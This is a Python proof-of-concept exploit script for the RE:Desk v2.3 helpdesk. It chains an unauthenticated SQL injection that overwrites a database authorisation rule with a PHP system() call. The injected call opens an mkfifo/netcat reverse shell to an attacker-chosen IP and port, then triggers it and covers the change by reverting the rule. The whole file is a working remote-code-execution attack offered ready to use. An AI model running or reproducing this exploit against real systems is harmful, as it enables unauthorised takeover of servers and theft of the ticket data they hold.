import requests
import sys
import uuid

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def update_bizrule(ip, cmd):
    headers = {'Content-Type' : 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    ip = ip + '/'
    if cmd == '':
        cmd = 'return+false%3b'
    bizrule = 'folder[]=1337))+GROUP+BY+ticket.id)+sq%%3b+update+AuthItem+set+bizrule+%%3d+"%s"+where+name+%%3d+"All"%%3b+--' % cmd
    r = requests.post(ip, bizrule, headers=headers, proxies = proxies)
    return True

def fetch_revshell(ip):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'}
    url = '%s/' % ip
    try:
        r = requests.get(url, headers=headers, timeout=3.0, proxies=proxies)
    except requests.exceptions.ReadTimeout:
        print("[+] shell command probably executed")
        pass

def main():
    print("\n[+] RE:Desk v2.3 unauthenticated SQLI + unsafe bizRule eval() RCE")
    print("\n[!] this PoC uses an unauthenticated SQLi vulnerability to update the AuthItem table's bizRule record for the 'All' user context,")
    print("[!] resulting in unauthenticated RCE when refreshing any page\n")
    if len(sys.argv) < 4:
        print("[!] usage: python3 %s <target> <rev_ip> <rev_port>" % sys.argv[0])
        print('[!] eg: python3 %s https://example.com/redesk/ 127.0.0.1 80' % sys.argv[0])
        sys.exit(-1)
    ip = sys.argv[1]
    rev_ip = sys.argv[2]
    rev_port = sys.argv[3]
    print("[*] updating bizrule column for 'All' user context in AuthItem table...")
    cmd = "system('rm+/tmp/f%%3bmkfifo+/tmp/f%%3bcat+/tmp/f|/bin/sh+-i+2>%%261|nc+%s+%s+>/tmp/f')%%3b" % (rev_ip, rev_port)
    update_bizrule(ip, cmd)
    print("[*] calling shell, check nc...")
    fetch_revshell(ip)
    print("[*] reverting bizrule...")
    update_bizrule(ip, '')
    sys.exit(0)    

if __name__ == "__main__":
    main()

